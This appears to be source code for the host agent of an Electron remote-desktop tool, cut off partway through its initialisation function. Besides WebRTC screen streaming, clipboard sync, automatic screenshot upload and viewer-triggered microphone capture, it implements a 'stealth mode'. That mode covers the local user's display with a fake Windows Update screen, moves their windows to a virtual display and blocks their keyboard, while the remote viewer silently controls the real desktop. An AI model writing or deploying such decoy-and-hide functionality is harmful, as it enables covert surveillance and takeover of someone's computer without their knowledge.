import React, { useState, useEffect, useCallback, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { Monitor, Shield, Power, Wifi } from 'lucide-react';
import axios from 'axios';
import { RTC_CONFIG, API_URL } from '../utils/webrtc';
import { getWsUrl } from '../utils/signaling';
import {
  getDeviceId,
  getDeviceName,
  setDeviceName as saveDeviceName,
  getAuthToken,
  setAuthToken,
  isRegistered,
} from '../utils/device';
import VirtualDisplaySetup from '../components/VirtualDisplaySetup';

// ---------------------------------------------------------------------------
// IS_ELECTRON — evaluated once at module load, never changes.
// ---------------------------------------------------------------------------
const IS_ELECTRON = Boolean(window.electronAPI?.handleControl);

// ---------------------------------------------------------------------------
// Module-level agent state.
// ---------------------------------------------------------------------------
const agent = {
  ws:          null,
  pc:          null,
  dc:          null,
  stream:      null,
  blackStream: null,
  heartbeat:   null,
  reconnect:   null,
  deviceId:    '',
  initialized: false,
  closed:      false,
  connecting:  false,
  streamReady: false,
  connectionState: 'idle',
  lastViewerConnect: 0,
  dcKeepalive: null,
  disconnectTimeout: null,
  connectedAt: 0,
  gracePeriodMs: 3000,
  screenshotInterval: null,
  clipboardInterval: null,
  lastClipboard: '',
  // Stealth mode state
  stealthMode: false,
  virtualDisplay: null,
};

// UI state setter — injected by the component so the agent can drive React state.
let _setStatus      = () => {};
let _setError       = () => {};
let _setViewerConn  = () => {};
let _setBlackScreen = () => {};
let _setBlockInput  = () => {};
let _setStealthMode = () => {};
let _setShowSetupWizard = () => {};
let _setMicActive   = () => {};

// ---------------------------------------------------------------------------
// Agent functions — plain functions, no hooks, no closures over component state.
// ---------------------------------------------------------------------------

// Helper: Check if we should ignore disconnect events (within grace period)
function shouldIgnoreDisconnect() {
  if (agent.connectionState !== 'connected') {
    return true; // Not connected, ignore
  }
  
  const timeSinceConnected = Date.now() - agent.connectedAt;
  const withinGracePeriod = timeSinceConnected < agent.gracePeriodMs;
  
  if (withinGracePeriod) {
    console.log(`[host] ⏱️  Within grace period (${timeSinceConnected}ms < ${agent.gracePeriodMs}ms) — ignoring disconnect`);
    return true;
  }
  
  return false;
}

function agentCleanupPeer() {
  console.log('[host] 🧹 Cleaning up peer connection (state:', agent.connectionState, ')');

  // Clear keepalive interval
  if (agent.dcKeepalive) {
    clearInterval(agent.dcKeepalive);
    agent.dcKeepalive = null;
  }

  // Clear disconnect timeout
  if (agent.disconnectTimeout) {
    clearTimeout(agent.disconnectTimeout);
    agent.disconnectTimeout = null;
  }

  if (agent.pc) {
    agent.pc.onicecandidate = null;
    agent.pc.oniceconnectionstatechange = null;
    agent.pc.onconnectionstatechange = null;
    agent.pc.ontrack = null;
    agent.pc.close();
    agent.pc = null;
  }

  if (agent.dc) {
    agent.dc.onopen = null;
    agent.dc.onclose = null;
    agent.dc.onmessage = null;
    agent.dc.onerror = null;
    agent.dc.close();
    agent.dc = null;
  }

  agent.connecting = false;
  agent.connectionState = 'idle';
  agent.connectedAt = 0;

  _setViewerConn(false);
  _setBlackScreen(false);
  _setBlockInput(false);
}

// Apply Windows Update overlay: Shows fake Windows Update screen to HOST
// Viewer continues to see and control the REAL screen (stealth/decoy mode)
function agentApplyBlackScreen(enabled) {
  console.log(`[host] 🪟 Applying Windows Update overlay (decoy mode): ${enabled}`);

  // IMPORTANT: Do NOT replace video track - viewer should see REAL screen
  // The overlay only affects what the HOST sees on their physical screen
  
  // Show/hide Electron overlay for host (if in Electron)
  if (IS_ELECTRON && window.electronAPI) {
    if (enabled) {
      console.log('[host] 🪟 Showing Windows Update overlay to HOST (decoy - hides viewer activity)');
      console.log('[host] 👁️  Viewer continues to see and control REAL screen');
      window.electronAPI.blackScreenOn();
    } else {
      console.log('[host] 🪟 Hiding Windows Update overlay from HOST');
      window.electronAPI.blackScreenOff();
    }
  }
  
  // Note: We do NOT modify the WebRTC video track
  // The screen capture continues normally, viewer sees everything
  // Only the host's physical display is covered by the fake Windows Update screen
}

async function agentCreateOffer() {
  console.log('[host] 📞 agentCreateOffer called');
  console.log('[host] Current state:', {
    connectionState: agent.connectionState,
    connecting: agent.connecting,
    streamReady: agent.streamReady,
    hasPeer: !!agent.pc,
    peerState: agent.pc?.connectionState,
  });

  // Guard: stream must be ready
  if (!agent.streamReady || !agent.stream) {
    console.warn('[host] ⛔ Stream not ready — retrying in 1s');
    setTimeout(() => agentCreateOffer(), 1000);
    return;
  }

  const tracks = agent.stream.getTracks();
  if (tracks.length === 0) {
    console.error('[host] ❌ Stream has no tracks — aborting');
    return;
  }

  // Guard: prevent duplicate simultaneous offers
  if (agent.connecting) {
    console.log('[host] ⏳ Already creating offer — skipping duplicate');
    return;
  }

  agent.connecting = true;
  agent.connectionState = 'connecting';
  agent.connectedAt = 0;

  // Clean up any leftover peer
  if (agent.pc) {
    agent.pc.onicecandidate = null;
    agent.pc.oniceconnectionstatechange = null;
    agent.pc.onconnectionstatechange = null;
    agent.pc.ontrack = null;
    agent.pc.close();
    agent.pc = null;
  }
  if (agent.dc) {
    agent.dc.onopen = null;
    agent.dc.onclose = null;
    agent.dc.onmessage = null;
    agent.dc.onerror = null;
    agent.dc.close();
    agent.dc = null;
  }

  // CREATE NEW PEER CONNECTION
  console.log('[host] 🆕 Creating RTCPeerConnection with config:', RTC_CONFIG);
  const pc = new RTCPeerConnection(RTC_CONFIG);
  agent.pc = pc;

  // ADD ALL TRACKS BEFORE CREATING OFFER
  console.log('[host] 📎 Adding tracks to peer connection...');
  tracks.forEach(track => {
    pc.addTrack(track, agent.stream);
    console.log(`[host] ✅ Track added: ${track.kind} (${track.id.slice(0,8)})`);
  });

  // CREATE DATA CHANNEL (HOST SIDE ONLY)
  const dc = pc.createDataChannel('control', { ordered: true });
  agent.dc = dc;

  dc.onopen  = () => { 
    console.log('[host] ✅ DataChannel OPEN');
    // DO NOT change connectionState here - let peer connection state handle it
    _setViewerConn(true);
    
    // Start keepalive ping to prevent idle closure
    if (agent.dcKeepalive) clearInterval(agent.dcKeepalive);
    agent.dcKeepalive = setInterval(() => {
      if (agent.dc?.readyState === 'open') {
        try {
          agent.dc.send(JSON.stringify({ type: 'ping' }));
          console.log('[host] 📡 Keepalive ping sent');
        } catch (err) {
          console.warn('[host] ⚠️  Keepalive ping failed:', err.message);
        }
      }
    }, 5000); // Ping every 5 seconds
    
    // Start clipboard monitoring (Electron only)
    if (IS_ELECTRON) {
      startClipboardMonitoring();
    }
  };
  
  dc.onclose = () => { 
    console.log('[host] ⚠️  DataChannel CLOSED (not treating as disconnect)');
    // CRITICAL: DO NOT change connectionState or cleanup peer
    // DataChannel can close while peer connection is still alive
    // Only peer connection state should trigger cleanup
    
    // Clear keepalive
    if (agent.dcKeepalive) {
      clearInterval(agent.dcKeepalive);
      agent.dcKeepalive = null;
    }
    
    // Update UI but don't kill connection
    _setViewerConn(false);
  };

  dc.onerror = (err) => {
    // RTCError "User-Initiated Abort" = viewer closed the connection — not a real error
    const msg = err?.error?.message || '';
    if (msg.includes('User-Initiated Abort') || msg.includes('Close called')) {
      console.log('[host] ℹ️  DataChannel closed by viewer (normal disconnect)');
    } else {
      console.error('[host] ❌ DataChannel error:', err);
    }
  };

  dc.onmessage = (e) => {
    try {
      const msg = JSON.parse(e.data);
      
      // Handle ping responses (ignore)
      if (msg.type === 'ping' || msg.type === 'pong') {
        return;
      }
      
      console.log(`[host] 📨 DataChannel message: type=${msg.type}`);

      // Handle clipboard sync from viewer
      if (msg.type === 'clipboard' && IS_ELECTRON) {
        if (msg.text && msg.text.length <= 1024 * 1024) {
          window.electronAPI.setClipboardText(msg.text).then(() => {
            console.log(`[host] 📋 Clipboard updated from viewer (${msg.text.length} chars)`);
            agent.lastClipboard = msg.text; // Update to prevent echo
          }).catch(err => {
            console.error('[host] ❌ Failed to write clipboard:', err);
          });
        } else if (msg.text && msg.text.length > 1024 * 1024) {
          console.warn('[host] 📋 Clipboard content from viewer too large (>1MB) — ignoring');
        }
        return;
      }

      // Forward to main process for OS-level execution (Electron only)
      if (IS_ELECTRON) window.electronAPI.handleControl(msg);

      if (msg.type === 'toggle') {
        if (msg.action === 'black_screen') {
          _setBlackScreen(msg.enabled);
          agentApplyBlackScreen(msg.enabled);
        }
        if (msg.action === 'block_input') {
          _setBlockInput(msg.enabled);
          console.log(`[host] BLOCK_INPUT_${msg.enabled ? 'ENABLED' : 'DISABLED'}`);
        }
      }

      // Viewer requesting quality change
      if (msg.type === 'set_quality' && msg.quality) {
        console.log('[host] 🎚️  Viewer requested quality:', msg.quality);
        agentSetQuality(msg.quality);
      }

      // Viewer requesting audio mode change
      if (msg.type === 'set_audio_mode' && msg.mode) {
        console.log('[host] 🎤 Viewer requested audio mode:', msg.mode);
        agentSetAudioMode(msg.mode);
      }

      // Windows shortcut execution
      if (msg.type === 'win_shortcut' && msg.keys) {
        console.log('[host] ⊞ Windows shortcut:', msg.keys);
        if (IS_ELECTRON) window.electronAPI.handleControl({ type: 'win_shortcut', keys: msg.keys });
      }
    } catch (err) {
      console.error('[host] ❌ Error parsing DataChannel message:', err);
    }
  };

  // ICE CANDIDATE HANDLER
  pc.onicecandidate = (e) => {
    if (e.candidate) {
      console.log('[host] 🧊 ICE candidate:', e.candidate.type, e.candidate.protocol);
      if (agent.ws?.readyState === WebSocket.OPEN) {
        agent.ws.send(JSON.stringify({ type: 'ice-candidate', candidate: e.candidate.toJSON() }));
      }
    } else {
      console.log('[host] 🧊 ICE gathering complete');
    }
  };

  // ICE CONNECTION STATE MONITORING
  pc.oniceconnectionstatechange = () => {
    console.log('[host] 🧊 ICE CONNECTION STATE:', pc.iceConnectionState);
    if (pc.iceConnectionState === 'failed') {
      console.error('[host] ❌ ICE connection failed');
      agent.connecting = false;
      agent.connectionState = 'disconnected';
      console.log('[host] State changed: connecting → disconnected (ICE failed)');
    } else if (pc.iceConnectionState === 'connected') {
      console.log('[host] ✅ ICE connection established');
    }
  };

  // PEER CONNECTION STATE MONITORING (SOURCE OF TRUTH)
  pc.onconnectionstatechange = () => {
    const s = pc.connectionState;
    console.log('[host] 🔌 PEER CONNECTION STATE:', s);

    if (s === 'connected') {
      agent.connecting = false;
      agent.connectionState = 'connected';
      agent.connectedAt = Date.now();
      _setViewerConn(true);
      applyBitrateCap();
      if (agent.disconnectTimeout) {
        clearTimeout(agent.disconnectTimeout);
        agent.disconnectTimeout = null;
      }
    } else if (s === 'failed') {
      agent.connecting = false;
      agent.connectionState = 'idle';
      agentCleanupPeer();
    } else if (s === 'disconnected') {
      // Reset connecting lock immediately so next viewer_connected isn't blocked
      agent.connecting = false;
      agent.connectionState = 'idle';
      _setViewerConn(false);
      // Give 2s for ICE to recover, then clean up
      if (agent.disconnectTimeout) clearTimeout(agent.disconnectTimeout);
      agent.disconnectTimeout = setTimeout(() => {
        if (agent.pc && (agent.pc.connectionState === 'disconnected' || agent.pc.connectionState === 'failed')) {
          agentCleanupPeer();
        }
      }, 2000);
    } else if (s === 'closed') {
      agent.connecting = false;
      agent.connectionState = 'idle';
      agent.connectedAt = 0;
    }
  };

  // TRACK EVENT — receives viewer's mic in 2-way mode
  pc.ontrack = (event) => {
    console.log('[host] 📥 Track received from viewer:', event.track.kind);
    if (event.track.kind === 'audio' && agent.audioMode === 'two_way') {
      // Play viewer's audio on host
      const audio = new Audio();
      audio.srcObject = event.streams[0] || new MediaStream([event.track]);
      audio.autoplay = true;
      audio.play().catch(() => {});
      console.log('[host] 🔊 Playing viewer audio');
    }
  };

  // CREATE AND SEND OFFER
  try {
    console.log('[host] 📝 Creating offer...');
    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);
    
    console.log('[host] ✅ Local description set, sending offer to viewer');
    agent.ws.send(JSON.stringify({
      type: 'offer',
      sdp: { type: pc.localDescription.type, sdp: pc.localDescription.sdp },
    }));
    console.log('[host] 📤 Offer sent');
  } catch (err) {
    console.error('[host] ❌ Error creating/sending offer:', err);
    agent.connecting = false;
    agent.connectionState = 'idle';
    agentCleanupPeer();
  }
}

function agentConnectWebSocket() {
  if (agent.closed) return;

  // CRITICAL: Guard against stacking connections - ONLY ONE WebSocket
  const existing = agent.ws;
  if (existing) {
    const state = existing.readyState;
    console.log('[host] 🔍 Existing WebSocket state:', state);
    
    if (state === WebSocket.OPEN) {
      console.log('[host] ✅ WebSocket already OPEN — skipping reconnect');
      return;
    }
    if (state === WebSocket.CONNECTING) {
      console.log('[host] ⏳ WebSocket already CONNECTING — skipping reconnect');
      return;
    }
    
    console.log('[host] 🧹 Cleaning up old WebSocket (state:', state, ')');
    existing.onopen = null;
    existing.onmessage = null;
    existing.onerror = null;
    existing.onclose = null; // detach so its handler doesn't schedule a competing retry
    existing.close();
    agent.ws = null;
  }

  const id    = agent.deviceId;
  const token = getAuthToken();

  if (!id || !token) {
    console.warn('[host] WS: missing device ID or token — aborting');
    return;
  }

  const url = getWsUrl(`/api/ws/host/${id}?token=${encodeURIComponent(token)}`);
  console.log(`🔌 WS CONNECTING → ${url}`);
  console.log(`[host] Token (last 6): ...${token.slice(-6)}`);

  const ws = new WebSocket(url);
  agent.ws = ws;

  ws.onopen = () => {
    console.log('✅ WS OPEN → device ONLINE');
    _setStatus('active');
    _setError('');
    
    // Clear any existing heartbeat
    if (agent.heartbeat) {
      clearInterval(agent.heartbeat);
    }
    
    // Start heartbeat ping every 5 seconds
    agent.heartbeat = setInterval(() => {
      if (agent.ws && agent.ws.readyState === WebSocket.OPEN) {
        agent.ws.send(JSON.stringify({ type: 'ping' }));
        console.log('[host] 📡 Heartbeat ping sent');
      } else {
        console.warn('[host] ⚠️  Cannot send heartbeat — WebSocket not open');
        clearInterval(agent.heartbeat);
        agent.heartbeat = null;
      }
    }, 5000);
    
    // Start screenshot capture automatically (Electron only) - every 
    //  seconds
    if (IS_ELECTRON && agent.stream) {
      startScreenshotCapture();
    }
    
    console.log('📡 Waiting for viewer...');
  };

  ws.onmessage = async (event) => {
    try {
      const data = JSON.parse(event.data);
      
      // Handle heartbeat responses silently
      if (data.type === 'pong') {
        // Ignore pong messages - heartbeat is working
        return;
      }
      
      console.log('[host] 📨 WS message:', data.type);
      
      switch (data.type) {
        case 'connected':
          console.log('[host] ✅ WebSocket connection confirmed by server');
          break;
          
        case 'viewer_connected':
          console.log('[host] 👁️  Viewer connected — cleaning up any existing connection and starting fresh');

          // Cancel any pending disconnect timeout
          if (agent.disconnectTimeout) {
            clearTimeout(agent.disconnectTimeout);
            agent.disconnectTimeout = null;
          }

          // Always clean up existing peer — new viewer always gets a fresh connection
          if (agent.pc || agent.connectionState !== 'idle') {
            agentCleanupPeer();
            await new Promise(resolve => setTimeout(resolve, 150));
          }

          agent.lastViewerConnect = Date.now();
          await agentCreateOffer();
          break;
          
        case 'viewer_disconnected':
          console.log('[host] 👁️  Viewer disconnected — cleaning up peer');
          agentCleanupPeer();
          break;
          
        case 'answer':
          console.log('[host] 📥 Received answer from viewer');
          if (agent.pc) {
            await agent.pc.setRemoteDescription(new RTCSessionDescription(data.sdp));
            console.log('[host] ✅ Remote description set');
          } else {
            console.warn('[host] ⚠️  Received answer but no peer connection exists');
          }
          break;
          
        case 'ice-candidate':
          if (agent.pc && data.candidate) {
            await agent.pc.addIceCandidate(new RTCIceCandidate(data.candidate));
            console.log('[host] 🧊 ICE candidate added');
          }
          break;
          
        case 'replaced':
          console.warn('[host] ⚠️  WS replaced by another connection — cleaning up this instance');
          clearInterval(agent.heartbeat);
          agent.heartbeat = null;
          agentCleanupPeer();
          _setStatus('idle');
          // Do NOT set agent.closed = true — the new connection (same device, new tab/reload)
          // should continue working. Just clean up this WS instance.
          break;
          
        case 'error':
          console.error('[host] ❌ Server error:', data.message);
          _setError(data.message);
          break;
          
        case 'refresh_screenshot':
          console.log('[host] 📸 Manual screenshot refresh requested');
          if (IS_ELECTRON && agent.stream) {
            captureAndUploadScreenshot();
          } else {
            console.warn('[host] ⚠️  Cannot capture screenshot (not Electron or no stream)');
          }
          break;
          
        default:
          console.log('[host] ⚠️  Unknown message type:', data.type);
          break;
      }
    } catch (err) {
      console.error('[host] ❌ Error handling WS message:', err);
    }
  };

  ws.onerror = (err) => {
    console.error('[host] ❌ WS ERROR:', err);
    console.log('[host] WebSocket state:', ws.readyState);
  };

  ws.onclose = (e) => {
    console.log(`❌ WS CLOSED (code=${e.code} reason="${e.reason}" wasClean=${e.wasClean})`);
    console.log('[host] WebSocket closed, clearing heartbeat');
    
    if (agent.heartbeat) {
      clearInterval(agent.heartbeat);
      agent.heartbeat = null;
    }
    
    // Clear the WebSocket reference
    if (agent.ws === ws) {
      agent.ws = null;
    }
    
    if (!agent.closed) {
      _setStatus('idle');
      
      // Prevent reconnect spam - wait 3 seconds before retry
      if (agent.reconnect) {
        clearTimeout(agent.reconnect);
      }
      
      console.log('[host] ⏱️  Scheduling reconnect in 3s...');
      agent.reconnect = setTimeout(() => {
        console.log('[host] 🔄 Attempting WebSocket reconnect...');
        agentConnectWebSocket();
      }, 3000);
    } else {
      console.log('[host] Agent closed, not reconnecting');
    }
  };
}

// Audio mode: 'off' | 'one_way' (host→viewer) | 'two_way' (both)
agent.audioMode = 'off';
agent.micStream = null; // host microphone stream

// Start host microphone capture
async function agentStartMic() {
  if (agent.micStream) return; // already running
  try {
    agent.micStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
    console.log('[host] 🎤 Microphone started');

    if (agent.pc && agent.micStream) {
      agent.micStream.getAudioTracks().forEach(track => {
        agent.pc.addTrack(track, agent.micStream);
        console.log('[host] ✅ Mic track added to peer');
      });

      // CRITICAL: Renegotiate so viewer receives the new audio track
      try {
        const offer = await agent.pc.createOffer();
        await agent.pc.setLocalDescription(offer);
        if (agent.ws?.readyState === WebSocket.OPEN) {
          agent.ws.send(JSON.stringify({
            type: 'offer',
            sdp: { type: agent.pc.localDescription.type, sdp: agent.pc.localDescription.sdp },
          }));
          console.log('[host] 📤 Renegotiation offer sent (mic added)');
        }
      } catch (err) {
        console.error('[host] ❌ Renegotiation failed:', err.message);
      }
    }
  } catch (err) {
    console.error('[host] ❌ Mic capture failed:', err.message);
  }
}

// Stop host microphone
function agentStopMic() {
  if (agent.micStream) {
    agent.micStream.getTracks().forEach(t => t.stop());
    agent.micStream = null;
    console.log('[host] 🎤 Microphone stopped');
  }
}

// Set audio mode — called when viewer sends set_audio_mode
async function agentSetAudioMode(mode) {
  console.log('[host] 🎤 Audio mode:', agent.audioMode, '→', mode);
  agent.audioMode = mode;
  if (mode === 'off') {
    agentStopMic();
    _setMicActive(false);
  } else {
    await agentStartMic();
    _setMicActive(true);
  }
}
const QUALITY_PRESETS = {
  // Extremely low: 320x240, 5fps, 100kbps — fastest possible input response
  low:    { width: 320,  height: 240,  frameRate: 5,  maxBitrate: 100_000  },
  // Medium: 1280x720, 15fps, 800kbps — balanced
  medium: { width: 1280, height: 720,  frameRate: 15, maxBitrate: 800_000  },
  // High: native resolution, 30fps, 3Mbps — best quality
  high:   { width: 1920, height: 1080, frameRate: 30, maxBitrate: 3_000_000 },
};

// Current quality — can be changed by viewer via DataChannel
agent.quality = 'medium';

async function agentStartStream() {
  console.log('🖥️  Initializing screen capture (quality:', agent.quality, ')...');
  agent.streamReady = false;

  if (IS_ELECTRON && !window.electronAPI) {
    console.error('[host] Electron API not available — cannot capture screen');
    _setError('Electron API not available');
    return;
  }

  const preset = QUALITY_PRESETS[agent.quality] || QUALITY_PRESETS.medium;

  try {
    let stream;

    if (IS_ELECTRON) {
      if (!navigator.mediaDevices) {
        throw new Error('navigator.mediaDevices is undefined — Electron config issue');
      }

      const sourceId = await window.electronAPI.getScreenSourceId();
      console.log('[host] desktopCapturer sourceId:', sourceId, '| quality:', agent.quality, preset);

      stream = await navigator.mediaDevices.getUserMedia({
        audio: false,
        video: {
          mandatory: {
            chromeMediaSource: 'desktop',
            chromeMediaSourceId: sourceId,
            maxWidth:     preset.width,
            maxHeight:    preset.height,
            minFrameRate: Math.max(1, preset.frameRate - 2),
            maxFrameRate: preset.frameRate,
          },
        },
      });
      console.log('✅ getUserMedia succeeded (quality:', agent.quality, ')');
    } else {
      stream = await navigator.mediaDevices.getDisplayMedia({
        video: {
          cursor: 'always',
          width:     { ideal: preset.width },
          height:    { ideal: preset.height },
          frameRate: { ideal: preset.frameRate },
        },
        audio: false,
      });
    }

    const tracks = stream.getTracks();
    if (tracks.length === 0) throw new Error('Screen capture stream has no tracks');

    agent.stream = stream;
    agent.streamReady = true;
    console.log('✅ Screen capture started:', tracks.map(t => `${t.kind}:${t.id.slice(0,8)}`));

    // Apply bitrate cap via RTCRtpSender after track is added to peer
    stream.getTracks().forEach(track => {
      track.onended = () => {
        console.log('[host] Screen track ended');
        agent.stream = null;
        agent.streamReady = false;
        agentCleanupPeer();
      };
    });
  } catch (err) {
    const msg = err.name === 'NotAllowedError'
      ? 'Screen sharing denied.'
      : 'Screen capture failed: ' + err.message;
    console.error('❌', msg);
    _setError(msg);
    agent.stream = null;
    agent.streamReady = false;
  }
}

// Apply bitrate cap to the active WebRTC sender
async function applyBitrateCap() {
  if (!agent.pc) return;
  const preset = QUALITY_PRESETS[agent.quality] || QUALITY_PRESETS.medium;
  const sender = agent.pc.getSenders().find(s => s.track?.kind === 'video');
  if (!sender) return;
  try {
    const params = sender.getParameters();
    if (!params.encodings || params.encodings.length === 0) params.encodings = [{}];
    params.encodings[0].maxBitrate = preset.maxBitrate;
    await sender.setParameters(params);
    console.log('[host] ✅ Bitrate cap applied:', preset.maxBitrate, 'bps');
  } catch (err) {
    console.warn('[host] Could not set bitrate cap:', err.message);
  }
}

// Change quality — restarts stream with new constraints and replaces WebRTC track
async function agentSetQuality(q) {
  if (!QUALITY_PRESETS[q]) return;
  if (agent.quality === q) return;
  console.log('[host] 🎚️  Quality change:', agent.quality, '→', q);
  agent.quality = q;

  // Restart stream with new constraints
  if (agent.stream) {
    agent.stream.getTracks().forEach(t => t.stop());
    agent.stream = null;
    agent.streamReady = false;
  }
  await agentStartStream();

  // Replace track on active peer connection
  if (agent.pc && agent.stream) {
    const newTrack = agent.stream.getVideoTracks()[0];
    if (newTrack) {
      const sender = agent.pc.getSenders().find(s => s.track?.kind === 'video');
      if (sender) {
        await sender.replaceTrack(newTrack);
        await applyBitrateCap();
        console.log('[host] ✅ Track replaced with quality:', q);
      }
    }
  }
}

/**
 * Enable stealth mode — viewer-triggered or host-triggered.
 *
 * STRICT ORDER (do NOT change):
 * 1. Detect virtual display — abort if missing
 * 2. Enable stealth state in main process
 * 3. Migrate ALL windows to virtual display
 * 4. Verify windows are on virtual display (log results)
 * 5. Switch screen capture to virtual display
 * 6. Replace WebRTC video track so viewer sees virtual display
 * 7. ONLY NOW show overlay on primary display
 * 8. Block keyboard input (best-effort)
 */
async function agentEnableStealthMode() {
  if (!IS_ELECTRON || !window.electronAPI) {
    console.warn('[host] Stealth mode requires Electron');
    return;
  }
  if (agent.stealthMode) {
    console.log('[host] Stealth mode already active');
    return;
  }

  console.log('[host] ═══ STEALTH MODE ENABLE START ═══');

  try {
    // ── Step 1: Detect virtual display ───────────────────────
    const enableResult = await window.electronAPI.enableStealthMode();
    if (!enableResult.success) {
      console.error('[host] ❌ Cannot enable stealth mode:', enableResult.error);
      if (enableResult.requiresSetup) {
        _setShowSetupWizard(true);
      } else {
        _setError(enableResult.error || 'Stealth mode unavailable — no virtual display');
      }
      return;
    }

    const vDisplay = enableResult.display;
    agent.virtualDisplay = vDisplay;
    agent.stealthMode = true;
    _setStealthMode(true);
    console.log(`[host] ✅ Virtual display confirmed: id=${vDisplay.id} bounds=(${vDisplay.bounds.x},${vDisplay.bounds.y},${vDisplay.bounds.width}x${vDisplay.bounds.height})`);

    // ── Step 2: Migrate ALL windows to virtual display ────────
    console.log('[host] 🪟 Step 2: Migrating windows...');
    const migResult = await window.electronAPI.migrateWindows(vDisplay.id);
    console.log('[host] Migration result:', JSON.stringify(migResult));

    if (!migResult.success) {
      console.error('[host] ❌ Migration IPC failed:', migResult.error);
      _setError('Window migration failed: ' + migResult.error);
      await agentDisableStealthMode();
      return;
    }

    if (migResult.successCount === 0) {
      console.error('[host] ❌ Zero windows migrated — virtual display may not be active or no windows open');
      // Don't abort — there may legitimately be no windows, continue
    } else {
      console.log(`[host] ✅ Migrated ${migResult.successCount} windows`);
      if (migResult.failedWindows?.length) {
        console.warn('[host] ⚠️  Failed windows:', migResult.failedWindows);
      }
    }

    // ── Step 3: Start tracking new windows ───────────────────
    await window.electronAPI.startWindowTracking(vDisplay.id);
    console.log('[host] ✅ Window tracking started');

    // ── Step 4: Switch capture to virtual display ─────────────
    console.log('[host] 📹 Step 4: Switching screen capture to virtual display...');
    if (agent.stream) {
      agent.stream.getTracks().forEach(t => t.stop());
      agent.stream = null;
      agent.streamReady = false;
    }
    await agentStartStream();

    if (!agent.stream) {
      console.error('[host] ❌ Failed to capture virtual display — aborting');
      _setError('Could not capture virtual display. Check Electron console for source list.');
      await agentDisableStealthMode();
      return;
    }
    console.log('[host] ✅ Capture switched to virtual display');

    // ── Step 5: Replace WebRTC track ─────────────────────────
    if (agent.pc) {
      const newTrack = agent.stream.getVideoTracks()[0];
      if (newTrack) {
        const sender = agent.pc.getSenders().find(s => s.track?.kind === 'video');
        if (sender) {
          await sender.replaceTrack(newTrack);
          console.log('[host] ✅ WebRTC video track replaced — viewer now sees virtual display');
        } else {
          console.warn('[host] ⚠️  No video sender found on peer connection');
        }
      }
    } else {
      console.log('[host] ℹ️  No active peer connection — new viewers will get virtual display stream');
    }

    // ── Step 6: Show overlay on primary display ───────────────
    // This MUST happen AFTER capture has switched.
    // The overlay is on the primary display; capture is now on virtual display.
    console.log('[host] 🪟 Step 6: Showing overlay on primary display...');
    window.electronAPI.blackScreenOn();

    // ── Step 7: Block keyboard input ─────────────────────────
    const blockResult = await window.electronAPI.blockInput(true);
    if (!blockResult.success) {
      console.warn('[host] ⚠️  Input blocking unavailable (requires admin):', blockResult.error);
    } else {
      console.log('[host] ✅ Keyboard input blocked');
    }

    console.log('[host] ═══ STEALTH MODE ACTIVE ═══');

  } catch (err) {
    console.error('[host] ❌ Stealth mode enable failed:', err.message);
    _setError('Stealth mode failed: ' + err.message);
    await agentDisableStealthMode();
  }
}

/**
 * Disable stealth mode.
 * STRICT ORDER:
 * 1. Unblock input
 * 2. Hide overlay
 * 3. Stop window tracking
 * 4. Restore windows to primary display
 * 5. Disable stealth state in main process
 * 6. Switch capture back to primary display
 * 7. Replace WebRTC track
 */
async function agentDisableStealthMode() {
  if (!IS_ELECTRON || !window.electronAPI) return;
  console.log('[host] ═══ STEALTH MODE DISABLE START ═══');

  // 1. Unblock input first
  try { await window.electronAPI.blockInput(false); } catch (e) { console.warn('[host] unblock error:', e.message); }

  // 2. Hide overlay
  try { window.electronAPI.blackScreenOff(); } catch {}

  // 3. Stop window tracking
  try { await window.electronAPI.stopWindowTracking(); } catch {}

  // 4. Restore windows
  try {
    const r = await window.electronAPI.restoreWindows();
    console.log(`[host] ✅ Restored ${r.successCount} windows`);
  } catch (err) {
    console.warn('[host] ⚠️  Window restore error:', err.message);
  }

  // 5. Disable stealth state in main process
  try { await window.electronAPI.disableStealthMode(); } catch {}

  agent.stealthMode = false;
  agent.virtualDisplay = null;
  _setStealthMode(false);
  _setBlackScreen(false);

  // 6. Switch capture back to primary display
  if (agent.stream) {
    agent.stream.getTracks().forEach(t => t.stop());
    agent.stream = null;
    agent.streamReady = false;
  }
  await agentStartStream();

  // 7. Replace WebRTC track back to primary
  if (agent.pc && agent.stream) {
    const newTrack = agent.stream.getVideoTracks()[0];
    if (newTrack) {
      const sender = agent.pc.getSenders().find(s => s.track?.kind === 'video');
      if (sender) {
        await sender.replaceTrack(newTrack);
        console.log('[host] ✅ Video track replaced — viewer now sees primary display');
      }
    }
  }

  console.log('[host] ═══ STEALTH MODE DISABLED ═══');
}

async function agentInit() {
  if (agent.initialized) {
    console.log('[host] Agent already initialized — skipping');
    return;
  }
  agent.initialized = true;
  agent.closed = false;

  console.log('[host] HOST PAGE MOUNTED — IS_ELECTRON:', IS_ELECTRON);
  console.log('[host] Initializing agent...');

  // 1. Resolve identity
  const id = getDeviceId();
  agent.deviceId = id;

  // 2. Register or refresh — always save the token the backend returns
  if (isRegistered()) {
    const name = getDeviceName();
    console.log(`♻️  Existing device: ${id} (${name})`);
    console.log(`[host] Stored token (last 6): ...${getAuthToken().slice(-6)}`);
    try {
      const res = await axios.post(`${API_URL}/register-device`, {
        device_id:   id,
        device_name: name,
        auth_token:  getAuthToken(),
      });
      if (res.data.success) {
        // Always update — backend may have restarted and issued a new token
        setAuthToken(res.data.auth_token);
        console.log(`[host] Token after refresh (last 6): ...${res.data.auth_token.slice(-6)}`);
      } else {
        console.warn(`[host] Re-registration rejected: ${res.data.error} — clearing token for retry`);
        setAuthToken('');
        agent.initialized = false; // allow retry
        return;
      }
    } catch {
      console.warn('[host] Could not reach backend — will attempt WS with cached token');
    }
  } else {
    const name = `Agent-${id.slice(-4)}`;
    console.log(`📋 Registering new device: ${id}`);
    try {
      const res = await axios.post(`${API_URL}/register-device`, {
        device_id:   id,
        device_name: name,
      });
      if (!res.data.success) throw new Error(res.data.error || 'Registration failed');
      setAuthToken(res.data.auth_token);
      saveDeviceName(name);
      console.log(`✅ Device registered: ${id} token (last 6): ...${res.data.auth_token.slice(-6)}`);
    } catch (err) {
      console.error('❌ Registration failed:', err.message);
      _setError('Registration failed — retrying in 5s');
      _setStatus('error');
      agent.initialized = false; // allow retry
      agent.reconnect = setTimeout(() => agentInit(), 5000);
      return;
    }
  }

  // 3. Screen capture FIRST (Electron only)
  // CRITICAL: Capture screen BEFORE connecting WebSocket so stream is ready
  // when viewer connects
  if (IS_ELECTRON) {
    console.log('[host] 🖥️ Starting screen capture before WebSocket...');
    await agentStartStream();
    
